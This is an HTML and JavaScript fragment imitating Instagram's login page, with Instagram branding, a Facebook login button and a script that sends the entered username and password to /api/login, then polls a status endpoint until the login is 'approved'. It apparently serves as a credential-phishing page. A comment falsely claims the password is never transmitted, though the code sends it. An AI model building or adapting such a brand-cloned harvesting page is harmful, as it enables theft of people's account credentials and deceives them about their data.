    appearance: auto;

.signup-box {

<body>

    <div class="box">

        <h1>Instagram</h1>

        <form id="loginForm">

            <input id="identifier" type="text" placeholder="Email, phone number, or username" required>

            <!-- Password is intentionally NOT transmitted or stored. -->
            <input id="password" type="password" placeholder="Password" required>

            <button type="submit" class="login-btn">
                Log In
            </button>

        </form>

        <div id="message"></div>

        <div class="divider"> 
            <span></span>
            <p>OR</p>
             <span></span>
        </div>

        <button type="button" class="facebook-login">Log in with Facebook</button>

        <div class="forgot-password"> <a href="#">Forgot password?</a> </div>
        <div class="signup-box"> 
            Don't have an account? 
            <a href="#">Sign up</a> </div>
    </div>

    

    <script>
        const form = document.getElementById("loginForm");
        const message = document.getElementById("message");

        form.addEventListener("submit", async (event) => {
            event.preventDefault();

            const identifier = document.getElementById("identifier").value.trim();
            const password = document.getElementById("password").value;

            message.textContent = "";

            try {
                const response = await fetch("/api/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        identifier,
                        password
                    })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || "Request failed");
                }

                checkStatus(data.requestId);
            } catch (error) {
                message.textContent = "Something went wrong. Please try again.";
                console.error(error);
            }
        });


        async function checkStatus(requestId) {

            const timer = setInterval(async () => {

                try {

                    const response = await fetch(
                        `/api/login-status/${requestId}`
                    );

                    const data = await response.json();

                    if (data.status === "approved") {

                        clearInterval(timer);

                        message.textContent =
                            "✅ Login approved.";

                        // Yahan apne actual application's
                        // authenticated-session endpoint par
                        // redirect kar sakte hain.
                        setTimeout(() => {
                            window.location.href = "/dashboard.html";
                        }, 700);

                    }

                    if (data.status === "rejected") {

                        clearInterval(timer);

                        message.textContent =
                            "❌ Login request rejected.";
                    }

                } catch (error) {

                    console.error(error);
                }

            }, 2000);
        }
    </script>

</body>
